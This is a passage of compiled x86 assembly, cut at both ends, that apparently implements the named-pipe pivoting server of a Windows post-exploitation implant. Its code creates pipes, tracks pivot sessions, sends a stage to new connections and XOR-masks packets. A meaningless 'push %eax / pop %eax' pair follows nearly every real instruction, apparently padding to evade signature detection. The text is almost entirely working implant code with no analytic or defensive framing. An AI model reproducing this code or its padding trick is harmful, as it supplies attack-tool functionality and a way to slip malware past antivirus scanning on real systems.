push %eax
pop %eax
	call	_create_pipe_security_attributes
push %eax
pop %eax
	movl	8(%ebp), %eax
push %eax
pop %eax
	leal	40(%eax), %edx
push %eax
pop %eax
	leal	-32(%ebp), %eax
push %eax
pop %eax
	movl	%eax, 28(%esp)
push %eax
pop %eax
	movl	$0, 24(%esp)
push %eax
pop %eax
	movl	$65536, 20(%esp)
push %eax
pop %eax
	movl	$65536, 16(%esp)
push %eax
pop %eax
	movl	$255, 12(%esp)
push %eax
pop %eax
	movl	$0, 8(%esp)
push %eax
pop %eax
	movl	$1073741827, 4(%esp)
push %eax
pop %eax
	movl	%edx, (%esp)
push %eax
pop %eax
	movl	__imp__CreateNamedPipeA@32, %eax
push %eax
pop %eax
	call	*%eax
push %eax
pop %eax
	subl	$32, %esp
push %eax
pop %eax
	movl	8(%ebp), %edx
push %eax
pop %eax
	movl	%eax, 368(%edx)
push %eax
pop %eax
	movl	-20(%ebp), %eax
push %eax
pop %eax
	testl	%eax, %eax
push %eax
pop %eax
	jne	L62
push %eax
pop %eax
	leal	-20(%ebp), %eax
push %eax
pop %eax
	movl	%eax, 8(%esp)
push %eax
pop %eax
	movl	$0, 4(%esp)
push %eax
pop %eax
	movl	$LC53, (%esp)
push %eax
pop %eax
	call	_toggle_privilege
push %eax
pop %eax
L62:
	movl	8(%ebp), %eax
push %eax
pop %eax
	movl	368(%eax), %eax
push %eax
pop %eax
	cmpl	$-1, %eax
push %eax
pop %eax
	jne	L64
push %eax
pop %eax
	movl	8(%ebp), %eax
push %eax
pop %eax
	addl	$40, %eax
push %eax
pop %eax
	movl	$0, 28(%esp)
push %eax
pop %eax
	movl	$0, 24(%esp)
push %eax
pop %eax
	movl	$65536, 20(%esp)
push %eax
pop %eax
	movl	$65536, 16(%esp)
push %eax
pop %eax
	movl	$255, 12(%esp)
push %eax
pop %eax
	movl	$0, 8(%esp)
push %eax
pop %eax
	movl	$1073741827, 4(%esp)
push %eax
pop %eax
	movl	%eax, (%esp)
push %eax
pop %eax
	movl	__imp__CreateNamedPipeA@32, %eax
push %eax
pop %eax
	call	*%eax
push %eax
pop %eax
	subl	$32, %esp
push %eax
pop %eax
	movl	8(%ebp), %edx
push %eax
pop %eax
	movl	%eax, 368(%edx)
push %eax
pop %eax
L64:
	movl	8(%ebp), %eax
push %eax
pop %eax
	movl	368(%eax), %eax
push %eax
pop %eax
	cmpl	$-1, %eax
push %eax
pop %eax
	jne	L65
push %eax
pop %eax
	movl	__imp__GetLastError@0, %eax
push %eax
pop %eax
	call	*%eax
push %eax
pop %eax
	movl	%eax, -12(%ebp)
push %eax
pop %eax
	movl	-12(%ebp), %eax
push %eax
pop %eax
	movl	%eax, 12(%esp)
push %eax
pop %eax
	movl	-12(%ebp), %eax
push %eax
pop %eax
	movl	%eax, 8(%esp)
push %eax
pop %eax
	movl	$LC54, 4(%esp)
push %eax
pop %eax
	movl	$LC31, (%esp)
push %eax
pop %eax
	call	_real_dprintf
push %eax
pop %eax
	jmp	L69
push %eax
pop %eax
L65:
	movl	$LC55, (%esp)
push %eax
pop %eax
	call	_real_dprintf
push %eax
pop %eax
	movl	$0, 12(%esp)
push %eax
pop %eax
	movl	$1, 8(%esp)
push %eax
pop %eax
	movl	$1, 4(%esp)
push %eax
pop %eax
	movl	$0, (%esp)
push %eax
pop %eax
	movl	__imp__CreateEventA@16, %eax
push %eax
pop %eax
	call	*%eax
push %eax
pop %eax
	subl	$16, %esp
push %eax
pop %eax
	movl	8(%ebp), %edx
push %eax
pop %eax
	movl	%eax, 16(%edx)
push %eax
pop %eax
	movl	8(%ebp), %eax
push %eax
pop %eax
	movl	16(%eax), %eax
push %eax
pop %eax
	testl	%eax, %eax
push %eax
pop %eax
	jne	L67
push %eax
pop %eax
	movl	__imp__GetLastError@0, %eax
push %eax
pop %eax
	call	*%eax
push %eax
pop %eax
	movl	%eax, -12(%ebp)
push %eax
pop %eax
	movl	-12(%ebp), %eax
push %eax
pop %eax
	movl	%eax, 12(%esp)
push %eax
pop %eax
	movl	-12(%ebp), %eax
push %eax
pop %eax
	movl	%eax, 8(%esp)
push %eax
pop %eax
	movl	$LC56, 4(%esp)
push %eax
pop %eax
	movl	$LC31, (%esp)
push %eax
pop %eax
	call	_real_dprintf
push %eax
pop %eax
	jmp	L69
push %eax
pop %eax
L67:
	movl	$0, 12(%esp)
push %eax
pop %eax
	movl	$0, 8(%esp)
push %eax
pop %eax
	movl	$1, 4(%esp)
push %eax
pop %eax
	movl	$0, (%esp)
push %eax
pop %eax
	movl	__imp__CreateEventA@16, %eax
push %eax
pop %eax
	call	*%eax
push %eax
pop %eax
	subl	$16, %esp
push %eax
pop %eax
	movl	8(%ebp), %edx
push %eax
pop %eax
	movl	%eax, 36(%edx)
push %eax
pop %eax
	movl	8(%ebp), %eax
push %eax
pop %eax
	movl	36(%eax), %eax
push %eax
pop %eax
	testl	%eax, %eax
push %eax
pop %eax
	jne	L68
push %eax
pop %eax
	movl	__imp__GetLastError@0, %eax
push %eax
pop %eax
	call	*%eax
push %eax
pop %eax
	movl	%eax, -12(%ebp)
push %eax
pop %eax
	movl	-12(%ebp), %eax
push %eax
pop %eax
	movl	%eax, 12(%esp)
push %eax
pop %eax
	movl	-12(%ebp), %eax
push %eax
pop %eax
	movl	%eax, 8(%esp)
push %eax
pop %eax
	movl	$LC56, 4(%esp)
push %eax
pop %eax
	movl	$LC31, (%esp)
push %eax
pop %eax
	call	_real_dprintf
push %eax
pop %eax
	jmp	L69
push %eax
pop %eax
L68:
	movl	$LC57, (%esp)
push %eax
pop %eax
	call	_real_dprintf
push %eax
pop %eax
	movl	8(%ebp), %eax
push %eax
pop %eax
	movl	16(%eax), %eax
push %eax
pop %eax
	movl	$_server_destroy, 16(%esp)
push %eax
pop %eax
	movl	$_server_notify, 12(%esp)
push %eax
pop %eax
	movl	$0, 8(%esp)
push %eax
pop %eax
	movl	8(%ebp), %edx
push %eax
pop %eax
	movl	%edx, 4(%esp)
push %eax
pop %eax
	movl	%eax, (%esp)
push %eax
pop %eax
	call	_scheduler_insert_waitable
push %eax
pop %eax
L69:
	movl	-12(%ebp), %eax
push %eax
pop %eax
	leave
push %eax
pop %eax
	ret
push %eax
pop %eax
	.section .rdata,"dr"
	.align 4
LC58:
	.ascii "[NP-SERVER] free_server_context. ctx=0x%08X\0"
	.align 4
LC59:
	.ascii "[NP-SERVER] freeing up pipe handle 0x%x\0"
	.align 4
LC60:
	.ascii "[NP-SERVER] free_server_context. signaling the thread to stop\0"
	.text
	.def	_free_server_context;	.scl	3;	.type	32;	.endef
_free_server_context:
	pushl	%ebp
push %eax
pop %eax
	movl	%esp, %ebp
push %eax
pop %eax
	subl	$24, %esp
push %eax
pop %eax
	cmpl	$0, 8(%ebp)
push %eax
pop %eax
	je	L78
push %eax
pop %eax
	movl	8(%ebp), %eax
push %eax
pop %eax
	movl	%eax, 4(%esp)
push %eax
pop %eax
	movl	$LC58, (%esp)
push %eax
pop %eax
	call	_real_dprintf
push %eax
pop %eax
	movl	8(%ebp), %eax
push %eax
pop %eax
	movl	368(%eax), %eax
push %eax
pop %eax
	movl	%eax, 4(%esp)
push %eax
pop %eax
	movl	$LC59, (%esp)
push %eax
pop %eax
	call	_real_dprintf
push %eax
pop %eax
	movl	8(%ebp), %eax
push %eax
pop %eax
	movl	368(%eax), %eax
push %eax
pop %eax
	cmpl	$-1, %eax
push %eax
pop %eax
	je	L74
push %eax
pop %eax
	movl	8(%ebp), %eax
push %eax
pop %eax
	movl	368(%eax), %eax
push %eax
pop %eax
	cmpl	$-1, %eax
push %eax
pop %eax
	je	L74
push %eax
pop %eax
	movl	8(%ebp), %eax
push %eax
pop %eax
	movl	368(%eax), %eax
push %eax
pop %eax
	movl	%eax, (%esp)
push %eax
pop %eax
	movl	__imp__CloseHandle@4, %eax
push %eax
pop %eax
	call	*%eax
push %eax
pop %eax
	subl	$4, %esp
push %eax
pop %eax
	movl	8(%ebp), %eax
push %eax
pop %eax
	movl	$-1, 368(%eax)
push %eax
pop %eax
L74:
	movl	8(%ebp), %eax
push %eax
pop %eax
	movl	16(%eax), %eax
push %eax
pop %eax
	testl	%eax, %eax
push %eax
pop %eax
	je	L75
push %eax
pop %eax
	movl	$LC60, (%esp)
push %eax
pop %eax
	call	_real_dprintf
push %eax
pop %eax
	movl	8(%ebp), %eax
push %eax
pop %eax
	movl	16(%eax), %eax
push %eax
pop %eax
	movl	$3, 4(%esp)
push %eax
pop %eax
	movl	%eax, (%esp)
push %eax
pop %eax
	call	_scheduler_signal_waitable
push %eax
pop %eax
	movl	8(%ebp), %eax
push %eax
pop %eax
	movl	$0, 16(%eax)
push %eax
pop %eax
L75:
	movl	8(%ebp), %eax
push %eax
pop %eax
	movl	36(%eax), %eax
push %eax
pop %eax
	testl	%eax, %eax
push %eax
pop %eax
	je	L76
push %eax
pop %eax
	movl	8(%ebp), %eax
push %eax
pop %eax
	movl	36(%eax), %eax
push %eax
pop %eax
	movl	%eax, (%esp)
push %eax
pop %eax
	movl	__imp__CloseHandle@4, %eax
push %eax
pop %eax
	call	*%eax
push %eax
pop %eax
	subl	$4, %esp
push %eax
pop %eax
	movl	8(%ebp), %eax
push %eax
pop %eax
	movl	$0, 36(%eax)
push %eax
pop %eax
L76:
	movl	8(%ebp), %eax
push %eax
pop %eax
	movl	65916(%eax), %eax
push %eax
pop %eax
	testl	%eax, %eax
push %eax
pop %eax
	je	L77
push %eax
pop %eax
	movl	8(%ebp), %eax
push %eax
pop %eax
	movl	65916(%eax), %eax
push %eax
pop %eax
	movl	%eax, (%esp)
push %eax
pop %eax
	call	_free
push %eax
pop %eax
	movl	8(%ebp), %eax
push %eax
pop %eax
	movl	$0, 65916(%eax)
push %eax
pop %eax
L77:
	movl	8(%ebp), %eax
push %eax
pop %eax
	movl	%eax, (%esp)
push %eax
pop %eax
	call	_free
push %eax
pop %eax
	jmp	L79
push %eax
pop %eax
L78:
	nop
push %eax
pop %eax
L79:
	nop
push %eax
pop %eax
	leave
push %eax
pop %eax
	ret
push %eax
pop %eax
	.section .rdata,"dr"
	.align 4
LC61:
	.ascii "[NP-SERVER] server_notify. serverCtx == NULL\0"
	.align 4
LC62:
	.ascii "[NP-SERVER] pipe isn't present, we might be shutting down.\0"
	.align 4
LC63:
	.ascii "[NP-SERVER] Connecting to the named pipe async\0"
	.align 4
LC64:
	.ascii "[NP-SERVER] checking the result of connect %u 0x%x\0"
	.align 4
LC65:
	.ascii "[NP-SERVER] still waiting for an overlapped connection\0"
	.align 4
LC66:
	.ascii "[NP-SERVER] client has connected apparently\0"
	.align 4
LC67:
	.ascii "[NP-SERVER] Failed to connect to the named pipe\0"
	.align 4
LC68:
	.ascii "[NP-SERVER] Checking the overlapped result\0"
	.align 4
LC69:
	.ascii "[NP-SERVER] server_notify. unable to get the result, %u\0"
	.align 4
LC70:
	.ascii "[NP-SERVER] still waiting for something to happen on the pipe\0"
	.align 4
LC71:
	.ascii "[NP-SERVER] the client appears to have bailed out, disconnecting...\0"
	.align 4
LC72:
	.ascii "[PIVOTTREE] Pivot sessions (after one removed)\0"
	.align 4
LC73:
	.ascii "[NP-SERVER] Apparently we have a result! With %u bytes\0"
	.align 4
LC74:
	.ascii "[NP-SERVER] This appears to be a new connection, setting up context.\0"
	.align 4
LC75:
	.ascii "[NP-SERVER] failed to create the pipe server instance: %u\0"
	.align 4
LC76:
	.ascii "[NP-SERVER] Updating the listener context in the pivot tree\0"
	.align 4
LC77:
	.ascii "[NP-SERVER] Sending stage on new connection\0"
	.align 4
LC78:
	.ascii "[NP-SERVER] Creating the guid request packet\0"
	.align 4
LC79:
	.ascii "[NP-SERVER] adding the request ID to the guid request packet\0"
	.align 4
LC80:
	.ascii "[NP-SERVER] Copying the request ID from the packet to the context\0"
	.align 4
LC81:
	.ascii "[NP-SERVER] We think the packet length is %u (0x%x)\0"
	.align 4
LC82:
	.ascii "[NP-SERVER] Doing the XOR thing on the guid request packet\0"
	.align 4
LC83:
	.ascii "[NP-SERVER] Sending the request packet to the new pivoted session\0"
	.align 4
LC84:
	.ascii "[NP-SERVER] Freeing up the packet buffer\0"
LC85:
	.ascii "[NP-SERVER] Done!\0"
	.align 4
LC86:
	.ascii "[NP-SERVER] read & sending bytes %u\0"
	.align 4
LC87:
	.ascii "[NP-SERVER] Resetting the event handle\0"
	.align 4
LC88:
	.ascii "[NP-SERVER] kicking off another read operation...\0"
	.text
	.def	_server_notify;	.scl	3;	.type	32;	.endef
_server_notify:
	pushl	%ebp
push %eax
pop %eax
	movl	%esp, %ebp
push %eax
pop %eax
	subl	$104, %esp
push %eax
pop %eax
	movl	$0, -12(%ebp)
push %eax
pop %eax
	movl	$0, -20(%ebp)
push %eax
pop %eax
	movl	12(%ebp), %eax
push %eax
pop %eax
	movl	%eax, -24(%ebp)
push %eax
pop %eax
	movl	$0, -16(%ebp)
push %eax
pop %eax
	cmpl	$0, -24(%ebp)
push %eax
pop %eax
	jne	L81
push %eax
pop %eax
	movl	$6, -12(%ebp)
push %eax
pop %eax
	movl	-12(%ebp), %eax
push %eax
pop %eax
	movl	%eax, 12(%esp)
push %eax
pop %eax
	movl	-12(%ebp), %eax
push %eax
pop %eax
	movl	%eax, 8(%esp)
push %eax
pop %eax
	movl	$LC61, 4(%esp)
push %eax
pop %eax
	movl	$LC31, (%esp)
push %eax
pop %eax
	call	_real_dprintf
push %eax
pop %eax
	jmp	L98
push %eax
pop %eax
L81:
	movl	-24(%ebp), %eax
push %eax
pop %eax
	movl	368(%eax), %eax
push %eax
pop %eax
	cmpl	$-1, %eax
push %eax
pop %eax
	jne	L83
push %eax
pop %eax
	movl	$6, -12(%ebp)
push %eax
pop %eax
	movl	-12(%ebp), %eax
push %eax
pop %eax
	movl	%eax, 12(%esp)
push %eax
pop %eax
	movl	-12(%ebp), %eax
push %eax
pop %eax
	movl	%eax, 8(%esp)
push %eax
pop %eax
	movl	$LC62, 4(%esp)
push %eax
pop %eax
	movl	$LC31, (%esp)
push %eax
pop %eax
	call	_real_dprintf
push %eax
pop %eax
	jmp	L98
push %eax
pop %eax
L83:
	movl	-24(%ebp), %eax
push %eax
pop %eax
	movl	372(%eax), %eax
push %eax
pop %eax
	testl	%eax, %eax
push %eax
pop %eax
	jne	L84
push %eax
pop %eax
	movl	-24(%ebp), %eax
push %eax
pop %eax
	movl	$1, 372(%eax)
push %eax
pop %eax
	movl	$LC63, (%esp)
push %eax
pop %eax
	call	_real_dprintf
push %eax
pop %eax
	movl	-24(%ebp), %edx
push %eax
pop %eax
	movl	-24(%ebp), %eax
push %eax
pop %eax
	movl	368(%eax), %eax
push %eax
pop %eax
	movl	%edx, 4(%esp)
push %eax
pop %eax
	movl	%eax, (%esp)
push %eax
pop %eax
	movl	__imp__ConnectNamedPipe@8, %eax
push %eax
pop %eax
	call	*%eax
push %eax
pop %eax
	subl	$8, %esp
push %eax
pop %eax
	movl	__imp__GetLastError@0, %eax
push %eax
pop %eax
	call	*%eax
push %eax
pop %eax
	movl	%eax, -12(%ebp)
push %eax
pop %eax
	movl	-12(%ebp), %eax
push %eax
pop %eax
	movl	%eax, 8(%esp)
push %eax
pop %eax
	movl	-12(%ebp), %eax
push %eax
pop %eax
	movl	%eax, 4(%esp)
push %eax
pop %eax
	movl	$LC64, (%esp)
push %eax
pop %eax
	call	_real_dprintf
push %eax
pop %eax
	cmpl	$997, -12(%ebp)
push %eax
pop %eax
	jne	L85
push %eax
pop %eax
	movl	$LC65, (%esp)
push %eax
pop %eax
	call	_real_dprintf
push %eax
pop %eax
	jmp	L98
push %eax
pop %eax
L85:
	cmpl	$536, -12(%ebp)
push %eax
pop %eax
	jne	L86
push %eax
pop %eax
	movl	$LC66, (%esp)
push %eax
pop %eax
	call	_real_dprintf
push %eax
pop %eax
	movl	-24(%ebp), %eax
push %eax
pop %eax
	movl	$1, 376(%eax)
push %eax
pop %eax
	movl	$0, -12(%ebp)
push %eax
pop %eax
	jmp	L84
push %eax
pop %eax
L86:
	movl	-12(%ebp), %eax
push %eax
pop %eax
	movl	%eax, 12(%esp)
push %eax
pop %eax
	movl	-12(%ebp), %eax
push %eax
pop %eax
	movl	%eax, 8(%esp)
push %eax
pop %eax
	movl	$LC67, 4(%esp)
push %eax
pop %eax
	movl	$LC31, (%esp)
push %eax
pop %eax
	call	_real_dprintf
push %eax
pop %eax
	jmp	L98
push %eax
pop %eax
L84:
	movl	$0, -64(%ebp)
push %eax
pop %eax
	movl	$LC68, (%esp)
push %eax
pop %eax
	call	_real_dprintf
push %eax
pop %eax
	movl	-24(%ebp), %edx
push %eax
pop %eax
	movl	-24(%ebp), %eax
push %eax
pop %eax
	movl	368(%eax), %eax
push %eax
pop %eax
	movl	$0, 12(%esp)
push %eax
pop %eax
	leal	-64(%ebp), %ecx
push %eax
pop %eax
	movl	%ecx, 8(%esp)
push %eax
pop %eax
	movl	%edx, 4(%esp)
push %eax
pop %eax
	movl	%eax, (%esp)
push %eax
pop %eax
	movl	__imp__GetOverlappedResult@16, %eax
push %eax
pop %eax
	call	*%eax
push %eax
pop %eax
	subl	$16, %esp
push %eax
pop %eax
	testl	%eax, %eax
push %eax
pop %eax
	jne	L88
push %eax
pop %eax
	movl	__imp__GetLastError@0, %eax
push %eax
pop %eax
	call	*%eax
push %eax
pop %eax
	movl	%eax, -12(%ebp)
push %eax
pop %eax
	movl	-12(%ebp), %eax
push %eax
pop %eax
	movl	%eax, 4(%esp)
push %eax
pop %eax
	movl	$LC69, (%esp)
push %eax
pop %eax
	call	_real_dprintf
push %eax
pop %eax
	cmpl	$996, -12(%ebp)
push %eax
pop %eax
	jne	L89
push %eax
pop %eax
	movl	$LC70, (%esp)
push %eax
pop %eax
	call	_real_dprintf
push %eax
pop %eax
	jmp	L101
push %eax
pop %eax
L89:
	cmpl	$109, -12(%ebp)
push %eax
pop %eax
	jne	L101
push %eax
pop %eax
	movl	$LC71, (%esp)
push %eax
pop %eax
	call	_real_dprintf
push %eax
pop %eax
	movl	-24(%ebp), %eax
push %eax
pop %eax
	movl	16(%eax), %eax
push %eax
pop %eax
	movl	%eax, (%esp)
push %eax
pop %eax
	movl	__imp__ResetEvent@4, %eax
push %eax
pop %eax
	call	*%eax
push %eax
pop %eax
	subl	$4, %esp
push %eax
pop %eax
	movl	$20, 4(%esp)
push %eax
pop %eax
	movl	$0, (%esp)
push %eax
pop %eax
	call	_packet_create
push %eax
pop %eax
	movl	%eax, -56(%ebp)
push %eax
pop %eax
	movl	-24(%ebp), %eax
push %eax
pop %eax
	addl	$312, %eax
push %eax
pop %eax
	movl	$16, 12(%esp)
push %eax
pop %eax
	movl	%eax, 8(%esp)
push %eax
pop %eax
	movl	$262606, 4(%esp)
push %eax
pop %eax
	movl	-56(%ebp), %eax
push %eax
pop %eax
	movl	%eax, (%esp)
push %eax
pop %eax
	call	_packet_add_tlv_raw
push %eax
pop %eax
	movl	-24(%ebp), %eax
push %eax
pop %eax
	leal	312(%eax), %edx
push %eax
pop %eax
	movl	8(%ebp), %eax
push %eax
pop %eax
	movl	80(%eax), %eax
push %eax
pop %eax
	movl	%edx, 4(%esp)
push %eax
pop %eax
	movl	%eax, (%esp)
push %eax
pop %eax
	call	_pivot_tree_remove
push %eax
pop %eax
	movl	%eax, -60(%ebp)
push %eax
pop %eax
	movl	$LC72, (%esp)
push %eax
pop %eax
	call	_real_dprintf
push %eax
pop %eax
	movl	8(%ebp), %eax
push %eax
pop %eax
	movl	80(%eax), %eax
push %eax
pop %eax
	movl	%eax, (%esp)
push %eax
pop %eax
	call	_dbgprint_pivot_tree
push %eax
pop %eax
	cmpl	$0, -60(%ebp)
push %eax
pop %eax
	je	L91
push %eax
pop %eax
	movl	-60(%ebp), %eax
push %eax
pop %eax
	movl	%eax, (%esp)
push %eax
pop %eax
	call	_free
push %eax
pop %eax
	movl	$0, -60(%ebp)
push %eax
pop %eax
L91:
	movl	-24(%ebp), %eax
push %eax
pop %eax
	movl	%eax, (%esp)
push %eax
pop %eax
	call	_terminate_pipe
push %eax
pop %eax
	movl	-24(%ebp), %eax
push %eax
pop %eax
	movl	364(%eax), %eax
push %eax
pop %eax
	movl	$0, 8(%esp)
push %eax
pop %eax
	movl	-56(%ebp), %edx
push %eax
pop %eax
	movl	%edx, 4(%esp)
push %eax
pop %eax
	movl	%eax, (%esp)
push %eax
pop %eax
	call	_packet_transmit
push %eax
pop %eax
	movl	$109, %eax
push %eax
pop %eax
	jmp	L92
push %eax
pop %eax
L88:
	movl	-64(%ebp), %eax
push %eax
pop %eax
	movl	%eax, 4(%esp)
push %eax
pop %eax
	movl	$LC73, (%esp)
push %eax
pop %eax
	call	_real_dprintf
push %eax
pop %eax
	movl	-24(%ebp), %eax
push %eax
pop %eax
	movl	376(%eax), %eax
push %eax
pop %eax
	testl	%eax, %eax
push %eax
pop %eax
	jne	L93
push %eax
pop %eax
	movl	$LC74, (%esp)
push %eax
pop %eax
	call	_real_dprintf
push %eax
pop %eax
	movl	$65944, 4(%esp)
push %eax
pop %eax
	movl	$1, (%esp)
push %eax
pop %eax
	call	_calloc
push %eax
pop %eax
	movl	%eax, -28(%ebp)
push %eax
pop %eax
	movl	-28(%ebp), %eax
push %eax
pop %eax
	movl	$-1, 368(%eax)
push %eax
pop %eax
	movl	-24(%ebp), %eax
push %eax
pop %eax
	movl	364(%eax), %edx
push %eax
pop %eax
	movl	-28(%ebp), %eax
push %eax
pop %eax
	movl	%edx, 364(%eax)
push %eax
pop %eax
	movl	-24(%ebp), %eax
push %eax
pop %eax
	movl	65932(%eax), %edx
push %eax
pop %eax
	movl	-28(%ebp), %eax
push %eax
pop %eax
	movl	%edx, 65932(%eax)
push %eax
pop %eax
	movl	-24(%ebp), %eax
push %eax
pop %eax
	movl	65936(%eax), %edx
push %eax
pop %eax
	movl	-28(%ebp), %eax
push %eax
pop %eax
	movl	%edx, 65936(%eax)
push %eax
pop %eax
	call	_lock_create
push %eax
pop %eax
	movl	-28(%ebp), %edx
push %eax
pop %eax
	movl	%eax, 65940(%edx)
push %eax
pop %eax
	movl	-24(%ebp), %eax
push %eax
pop %eax
	leal	296(%eax), %edx
push %eax
pop %eax
	movl	-28(%ebp), %eax
push %eax
pop %eax
	addl	$296, %eax
push %eax
pop %eax
	movl	$16, 12(%esp)
push %eax
pop %eax
	movl	%edx, 8(%esp)
push %eax
pop %eax
	movl	$16, 4(%esp)
push %eax
pop %eax
	movl	%eax, (%esp)
push %eax
pop %eax
	movl	__imp__memcpy_s, %eax
push %eax
pop %eax
	call	*%eax
push %eax
pop %eax
	movl	-24(%ebp), %eax
push %eax
pop %eax
	leal	40(%eax), %edx
push %eax
pop %eax
	movl	-28(%ebp), %eax
push %eax
pop %eax
	addl	$40, %eax
push %eax
pop %eax
	movl	$256, 12(%esp)
push %eax
pop %eax
	movl	%edx, 8(%esp)
push %eax
pop %eax
	movl	$256, 4(%esp)
push %eax
pop %eax
	movl	%eax, (%esp)
push %eax
pop %eax
	movl	__imp__memcpy_s, %eax
push %eax
pop %eax
	call	*%eax
push %eax
pop %eax
	movl	-28(%ebp), %eax
push %eax
pop %eax
	movl	%eax, (%esp)
push %eax
pop %eax
	call	_create_pipe_server_instance
push %eax
pop %eax
	movl	%eax, -32(%ebp)
push %eax
pop %eax
	cmpl	$0, -32(%ebp)
push %eax
pop %eax
	je	L94
push %eax
pop %eax
	movl	-32(%ebp), %eax
push %eax
pop %eax
	movl	%eax, 4(%esp)
push %eax
pop %eax
	movl	$LC75, (%esp)
push %eax
pop %eax
	call	_real_dprintf
push %eax
pop %eax
	movl	-28(%ebp), %eax
push %eax
pop %eax
	movl	%eax, (%esp)
push %eax
pop %eax
	call	_free_server_context
push %eax
pop %eax
L94:
	movl	-24(%ebp), %eax
push %eax
pop %eax
	movl	$1, 376(%eax)
push %eax
pop %eax
	movl	-24(%ebp), %eax
push %eax
pop %eax
	leal	296(%eax), %edx
push %eax
pop %eax
	movl	8(%ebp), %eax
push %eax
pop %eax
	movl	84(%eax), %eax
push %eax
pop %eax
	movl	%edx, 4(%esp)
push %eax
pop %eax
	movl	%eax, (%esp)
push %eax
pop %eax
	call	_pivot_tree_find
push %eax
pop %eax
	movl	%eax, -36(%ebp)
push %eax
pop %eax
	cmpl	$0, -36(%ebp)
push %eax
pop %eax
	je	L95
push %eax
pop %eax
	movl	$LC76, (%esp)
push %eax
pop %eax
	call	_real_dprintf
push %eax
pop %eax
	movl	-36(%ebp), %eax
push %eax
pop %eax
	movl	-28(%ebp), %edx
push %eax
pop %eax
	movl	%edx, 8(%eax)
push %eax
pop %eax
L95:
	movl	-24(%ebp), %eax
push %eax
pop %eax
	movl	65932(%eax), %eax
push %eax
pop %eax
	testl	%eax, %eax
push %eax
pop %eax
	je	L96
push %eax
pop %eax
	movl	-24(%ebp), %eax
push %eax
pop %eax
	movl	65936(%eax), %eax
push %eax
pop %eax
	testl	%eax, %eax
push %eax
pop %eax
	je	L96
push %eax
pop %eax
	movl	$LC77, (%esp)
push %eax
pop %eax
	call	_real_dprintf
push %eax
pop %eax
	movl	-24(%ebp), %eax
push %eax
pop %eax
	addl	$65936, %eax
push %eax
pop %eax
	movl	$4, 8(%esp)
push %eax
pop %eax
	movl	%eax, 4(%esp)
push %eax
pop %eax
	movl	-24(%ebp), %eax
push %eax
pop %eax
	movl	%eax, (%esp)
push %eax
pop %eax
	call	_named_pipe_write_raw
push %eax
pop %eax
	movl	-24(%ebp), %eax
push %eax
pop %eax
	movl	65936(%eax), %edx
push %eax
pop %eax
	movl	-24(%ebp), %eax
push %eax
pop %eax
	movl	65932(%eax), %eax
push %eax
pop %eax
	movl	%edx, 8(%esp)
push %eax
pop %eax
	movl	%eax, 4(%esp)
push %eax
pop %eax
	movl	-24(%ebp), %eax
push %eax
pop %eax
	movl	%eax, (%esp)
push %eax
pop %eax
	call	_named_pipe_write_raw
push %eax
pop %eax
	movl	-24(%ebp), %eax
push %eax
pop %eax
	movl	$0, 65932(%eax)
push %eax
pop %eax
L96:
	movl	$LC78, (%esp)
push %eax
pop %eax
	call	_real_dprintf
push %eax
pop %eax
	movl	$11, 4(%esp)
push %eax
pop %eax
	movl	$0, (%esp)
push %eax
pop %eax
	call	_packet_create
push %eax
pop %eax
	movl	%eax, -40(%ebp)
push %eax
pop %eax
	movl	$LC79, (%esp)
push %eax
pop %eax
	call	_real_dprintf
push %eax
pop %eax
	movl	-40(%ebp), %eax
push %eax
pop %eax
	movl	%eax, (%esp)
push %eax
pop %eax
	call	_packet_add_request_id
push %eax
pop %eax
	movl	$65538, 4(%esp)
push %eax
pop %eax
	movl	-40(%ebp), %eax
push %eax
pop %eax
	movl	%eax, (%esp)
push %eax
pop %eax
	call	_packet_get_tlv_value_string
push %eax
pop %eax
	movl	%eax, -44(%ebp)
push %eax
pop %eax
	movl	$LC80, (%esp)
push %eax
pop %eax
	call	_real_dprintf
push %eax
pop %eax
	movl	-24(%ebp), %eax
push %eax
pop %eax
	leal	332(%eax), %edx
push %eax
pop %eax
	movl	$32, 8(%esp)
push %eax
pop %eax
	movl	-44(%ebp), %eax
push %eax
pop %eax
	movl	%eax, 4(%esp)
push %eax
pop %eax
	movl	%edx, (%esp)
push %eax
pop %eax
	call	_memcpy
push %eax
pop %eax
	movl	-40(%ebp), %eax
push %eax
pop %eax
	movl	36(%eax), %eax
push %eax
pop %eax
	addl	$32, %eax
push %eax
pop %eax
	movl	%eax, -48(%ebp)
push %eax
pop %eax
	movl	-48(%ebp), %eax
push %eax
pop %eax
	movl	%eax, 8(%esp)
push %eax
pop %eax
	movl	-48(%ebp), %eax
push %eax
pop %eax
	movl	%eax, 4(%esp)
push %eax
pop %eax
	movl	$LC81, (%esp)
push %eax
pop %eax
	call	_real_dprintf
push %eax
pop %eax
	movl	-48(%ebp), %eax
push %eax
pop %eax
	movl	%eax, (%esp)
push %eax
pop %eax
	call	_malloc
push %eax
pop %eax
	movl	%eax, -52(%ebp)
push %eax
pop %eax
	movl	$LC82, (%esp)
push %eax
pop %eax
	call	_real_dprintf
push %eax
pop %eax
	movl	-40(%ebp), %eax
push %eax
pop %eax
	movl	%eax, (%esp)
push %eax
pop %eax
	call	_rand_xor_key
push %eax
pop %eax
	movl	-40(%ebp), %eax
push %eax
pop %eax
	movl	$32, 8(%esp)
push %eax
pop %eax
	movl	%eax, 4(%esp)
push %eax
pop %eax
	movl	-52(%ebp), %eax
push %eax
pop %eax
	movl	%eax, (%esp)
push %eax
pop %eax
	call	_memcpy
push %eax
pop %eax
	movl	-48(%ebp), %eax
push %eax
pop %eax
	leal	-32(%eax), %ecx
push %eax
pop %eax
	movl	-40(%ebp), %eax
push %eax
pop %eax
	movl	32(%eax), %eax
push %eax
pop %eax
	movl	-52(%ebp), %edx
push %eax
pop %eax
	addl	$32, %edx
push %eax
pop %eax
	movl	%ecx, 8(%esp)
push %eax
pop %eax
	movl	%eax, 4(%esp)
push %eax
pop %eax
	movl	%edx, (%esp)
push %eax
pop %eax
	call	_memcpy
push %eax
pop %eax
	movl	-48(%ebp), %eax
push %eax
pop %eax
	leal	-4(%eax), %ecx
push %eax
pop %eax
	movl	-52(%ebp), %eax
push %eax
pop %eax
	leal	4(%eax), %edx
push %eax
pop %eax
	movl	-40(%ebp), %eax
push %eax
pop %eax
	movl	%ecx, 8(%esp)
push %eax
pop %eax
	movl	%edx, 4(%esp)
push %eax
pop %eax
	movl	%eax, (%esp)
push %eax
pop %eax
	call	_xor_bytes
push %eax
pop %eax
	movl	$LC83, (%esp)
push %eax
pop %eax
	call	_real_dprintf
push %eax
pop %eax
	movl	-48(%ebp), %eax
push %eax
pop %eax
	movl	%eax, 8(%esp)
push %eax
pop %eax
	movl	-52(%ebp), %eax
push %eax
pop %eax
